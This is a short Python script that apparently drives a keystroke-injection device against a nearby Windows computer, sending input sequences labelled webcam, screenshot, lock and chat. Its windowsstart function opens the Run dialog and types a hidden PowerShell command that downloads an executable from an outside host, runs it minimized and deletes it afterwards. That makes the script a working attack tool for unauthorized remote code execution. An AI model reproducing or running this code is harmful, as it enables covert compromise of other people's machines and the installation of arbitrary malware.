from mappings import Injector  
from enum import Enum
import time 

class Commands(Enum):
  webcam = 'webcam'
  screenshot = 'screenshot'
  windowslock = 'windowslock'
  chat = 'chat'
  windowsstart = 'windowsstart'

  def __str__(self):
    return self.value

def webcam(p):
    i = Injector(p)
    i.start_injection()
    i.send_left()
    i.send_right()
    i.send_left()
    i.send_right()
    i.stop_injection()

def screenshot(p):
    i = Injector(p)
    i.start_injection()
    i.send_left()
    i.send_left()
    i.send_right()
    i.send_right()
    i.stop_injection()

def windowslock(p):
    i = Injector(p)
    i.start_injection()
    i.send_winplusl()
    i.stop_injection()

def chat(p, message):
    print("chat")
    i = Injector(p)
    i.start_injection()
    i.send_admin_sequence()
    i.inject_string(message)
    i.send_enter()
    i.stop_injection()

def windowsstart(p):
    i = Injector(p)
    i.start_injection()
    i.send_winplusr()
    time.sleep(1)
    i.inject_string("powershell -w h [Net.ServicePointManager]::SecurityProtocol='tls12';(New-Object Net.WebClient).DownloadFile('http://p.nsa.chat','%HOMEPATH%\\n.exe');Start-Process -wai -wi mi -f '~\\n.exe';Remove-Item -pa '~\\n.exe';exit")
    i.send_enter()
    i.stop_injection()
